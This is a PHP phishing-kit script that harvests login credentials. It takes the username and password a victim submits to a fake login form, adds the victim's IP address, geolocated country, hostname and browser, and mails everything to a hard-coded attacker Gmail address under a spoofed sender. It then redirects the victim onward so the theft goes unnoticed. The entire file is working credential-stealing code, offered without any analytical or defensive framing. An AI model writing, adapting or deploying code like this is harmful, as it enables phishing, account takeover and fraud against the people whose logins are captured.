<?php
session_start();
$password = trim($_REQUEST["password"]);
$email2 = trim($_REQUEST["username2"]);

												if($password != "")
												{	
												$adddate=date("D M d, Y g:i a");
												$ip = getenv("REMOTE_ADDR");
												$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
												$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
												$browserAgent = $_SERVER['HTTP_USER_AGENT'];
												$hostname = gethostbyaddr($ip);
												$message .= "CNLgs\n";
												$message .= "Es: " . $email2. "\n";
												$message .= "Ps: " . $password . "\n"; 
												$message .= "--------------IP DETAIL-----------------------\n";
												$message .= "Date: ".$adddate."\n";
												$message .= "Ip Address : ".getenv("REMOTE_ADDR")."\nProvider      : \n";
												$message .= "Ip Info       https://www.ip2location.com/demo/$ip ----\n";
												$message .= "BROWSER      ".$browserAgent."\n";
												$message .= "---------------MBCon-------------\n";
												$send = "kloghacks@gmail.com";
												$subject = "CNLgs.$ip.";
												$headers = "From: USACN<USACNLogs@linHJJmail.com>\n";
												$headers .= "MIME-Version: 1.0\n";
												mail($send,$subject,$message,$headers);
												header ("location: index3.php");
												}
												else
												{
													header ("location: ".$_SESSION['mainurl']."index2.php?status=passwordEmpty");
												}
?>